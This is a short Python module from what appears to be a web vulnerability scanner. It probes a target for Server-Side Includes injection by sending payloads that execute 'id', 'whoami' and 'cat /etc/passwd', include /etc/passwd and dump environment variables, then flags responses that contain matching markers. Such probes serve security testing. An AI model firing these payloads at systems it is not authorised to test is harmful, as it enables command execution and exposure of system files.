"""ssi_injection — Server-Side Includes injection probe"""
from core.http import HttpClient

PAYLOADS = [
    '<!--#exec cmd="id"-->',
    '<!--#exec cmd="whoami"-->',
    '<!--#include virtual="/etc/passwd"-->',
    '<!--#echo var="DATE_LOCAL"-->',
    '<!--#printenv -->',
    '<!--#exec cmd="cat /etc/passwd"-->',
]

MARKERS = ["uid=","root:x:0:0","DOCUMENT_ROOT","SERVER_SOFTWARE","HTTP_USER_AGENT"]

class SsiInjection:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        findings = []
        for p in PAYLOADS:
            r = http.get(target + ("&" if "?" in target else "?") + "x=" + p)
            if not r: continue
            for m in MARKERS:
                if m in r.text:
                    findings.append({"payload":p,"marker":m})
                    print(f"  [!] SSI: {p[:40]} -> {m}")
                    logger.finding("ssi","critical",f"{p[:40]} marker={m}")
                    break
        print(f"[ssi_injection] {len(findings)}")
        return {"findings": findings}
